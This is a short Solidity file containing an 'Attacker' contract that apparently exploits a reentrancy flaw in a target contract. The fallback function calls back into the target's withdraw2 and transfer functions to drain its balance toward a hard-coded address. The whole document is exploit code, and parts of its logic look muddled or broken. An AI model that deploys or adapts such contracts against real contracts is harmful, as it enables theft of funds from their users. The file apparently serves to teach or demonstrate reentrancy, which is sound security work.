pragma solidity 0.8.17;


interface IReentrancy {
    function deposit() external payable;
    function withdraw2() external;
    function transfer(address to, uint256 amount) external;
    function balances(address) external view returns (uint256);

}

contract Attacker {


    IReentrancy reentrancy;
    uint256 amount = msg.value;

    constructor(address _reentrancyAddress) public payable {
        reentrancy=IReentrancy(_reentrancyAddress);

    }

    fallback() external payable{
        // if(address(reentrancy).balance >= 1 ether){
        //     uint256 remainingAmount = address(reentrancy).balance;
        //     reentrancy.transfer(msg.sender,remainingAmount);
        // }

        if(address(reentrancy).balance >= reentrancy.balances(address(this))) {
            reentrancy.transfer(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,1);
            attack();
        }


    }
    

    function attack() public  payable{
        reentrancy.deposit{value:1 ether}();
        reentrancy.withdraw2();

    }

    function balanceOfAttackerAddress() public view returns(uint256){
        return address(msg.sender).balance;
    }
    

    function contractbalance() public view returns(uint256){
        return address(this).balance;
    }
}